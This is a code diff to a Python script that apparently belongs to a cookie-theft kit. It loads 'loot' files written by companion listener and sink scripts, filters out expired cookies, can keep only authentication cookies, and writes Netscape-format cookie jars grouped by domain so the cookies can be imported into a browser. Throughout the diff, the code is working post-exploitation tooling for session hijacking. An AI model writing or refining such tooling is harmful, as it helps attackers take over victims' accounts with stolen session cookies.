@@ -27,10 +27,19 @@ def base(dom):
     if len(p) > 2 and ".".join(p[-2:]) in TWO: return ".".join(p[-3:])
     return ".".join(p[-2:]) if len(p) > 1 else d
 
+def expiry(c):
+    try:
+        return int(c.get("expirationDate") or c.get("expires") or 0)
+    except (TypeError, ValueError):
+        return 0
+
 def keep(c, session, auth, now):
-    e = int(c.get("expires") or 0)
-    if e and e < now - 300: return False                    # expired never works
-    if session and e: return False                           # session = no recorded expiry
+    if not isinstance(c, dict) or not c.get("name"): return False
+    if not c.get("domain"): return False                          # nothing to group on
+    if c.get("name") in ("password", "token"): return False       # listen.py mixes logins/tokens in
+    e = expiry(c)
+    if e and e < now - 300: return False                          # expired never works
+    if session and e: return False                                # session = no recorded expiry
     nm = c.get("name") or ""
     if JUNK.search(nm): return False
     if auth and not AUTH.search(nm): return False
@@ -38,17 +47,32 @@ def keep(c, session, auth, now):
 
 def line(c, keep_flag, plain, now):
     dom = c["domain"] if c["domain"].startswith(".") else "." + c["domain"]
-    exp = int(c.get("expires") or 0)
+    exp = expiry(c)
     if not exp: exp = now + 31_536_000 if keep_flag else 0
     secure = bool(c.get("secure")) or c.get("sameSite") == "None"   # None without Secure is discarded
     if not plain and c.get("httpOnly"): dom = "#HttpOnly_" + dom
     return "\t".join([dom, "TRUE", c.get("path") or "/", "TRUE" if secure else "FALSE",
                       str(exp), c["name"], c.get("value") or ""])
 
+def load_cookies():
+    """listen.py writes loot/all_cookies.json; sink.py writes loot/cookies_all.json.
+    Accept both (and the legacy file in the project root)."""
+    for p in (os.path.join(HERE, "loot", "all_cookies.json"),
+              os.path.join(HERE, "loot", "cookies_all.json"),
+              os.path.join(HERE, "cookies_all.json")):
+        if os.path.exists(p):
+            try:
+                with open(p, encoding="utf-8") as f:
+                    data = json.load(f)
+                if isinstance(data, list): return data, p
+            except Exception:
+                continue
+    return None, None
+
 def main():
-    j = os.path.join(HERE, "cookies_all.json")
-    if not os.path.exists(j): sys.exit("run sink.py or cookielog.py first")
-    cookies = json.load(open(j, encoding="utf-8"))
+    cookies, src = load_cookies()
+    if cookies is None: sys.exit("run listen.py or sink.py first (no loot/all_cookies.json)")
+    print("[*] reading %s (%d records)" % (src, len(cookies)))
     a  = sys.argv[1:]
     fl = {x for x in a if x.startswith("--")}
     want = next((x for x in a if not x.startswith("--")), None)
@@ -59,7 +83,10 @@ def main():
     now, groups = int(time.time()), {}
     for c in cookies:
         if not keep(c, session, auth, now): continue
-        if (ln := line(c, keepf, plain, now)): groups.setdefault(base(c["domain"]), []).append(ln)
+        b = base(c.get("domain") or "")
+        if not b: continue
+        ln = line(c, keepf, plain, now)
+        if ln: groups.setdefault(b, []).append(ln)
 
     os.makedirs(OUT, exist_ok=True)
     if not want:
